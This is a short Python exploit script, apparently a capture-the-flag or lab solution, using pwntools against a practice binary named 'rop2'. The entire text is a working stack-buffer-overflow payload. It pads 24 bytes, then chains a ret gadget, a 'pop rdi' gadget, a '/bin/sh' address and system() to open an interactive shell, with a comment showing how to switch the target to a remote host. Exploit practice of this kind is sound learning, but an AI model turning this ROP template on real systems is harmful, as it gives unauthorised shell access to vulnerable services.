from pwn import *

io = process('./rop2') # or later: io = remote('HOST', PORT)
offset = 24
binsh_address = 0x404028
system_address = 0x401060
gadget_address = 0x40117E # pop rdi
ret_address = 0x40117F # ret
payload = b'A' * offset + p64(ret_address) + p64(gadget_address) + p64(binsh_address) + p64(system_address)
io.sendafter(b'ROP 2', payload)
io.interactive()
